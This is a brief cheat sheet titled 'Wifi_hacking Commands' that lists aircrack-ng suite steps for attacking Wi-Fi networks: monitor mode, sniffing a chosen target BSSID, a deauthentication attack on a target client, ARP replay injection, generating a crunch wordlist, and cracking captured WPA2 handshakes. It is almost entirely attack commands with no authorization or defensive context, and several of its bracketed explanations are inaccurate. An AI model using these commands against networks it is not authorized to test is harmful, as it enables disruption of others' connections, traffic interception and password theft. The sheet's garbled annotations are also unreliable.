# Wifi_hacking Commands
iwconfig
[call airmon-ng wireless interface]

ifconfig wlan0 up/down
[change network]

airmon-ng check kill
[kill wifi network]

iwconfig wlan0 mode monitor
[monitor mode]

service NetworkManager restart
[start network back]

airodump-ng wlan0
[monitor packets]

airodump-ng --bssid (enter bssid) --channel (CH) --write (name file) wlan0
[specifiy a single network for sniffing]

airmon-ng start (network name)
[to turn to monitor mode]

airmon-ng stop()
[stop mon mode]

aireplay-ng --deauth (set timer) -a (target BSSID) -c (target MAC) wlan0
[deauth attack]

aireplay-ng --arpreplay -b (target MAC with WPS) -h (wlan MAC address) wlan0
[assocaite with a network of less data]

sudo apt install crunch
Install crunch

crunch 6 8 abc -o test.txt -t (e.g Q@@@@U)
[add guess to crunch wordlist]

aircrack-ng (.cap) -w test.txt
[crack WPA2 using wordlist]

sudo NetworkManager start
[restart Machine's wireless interface]
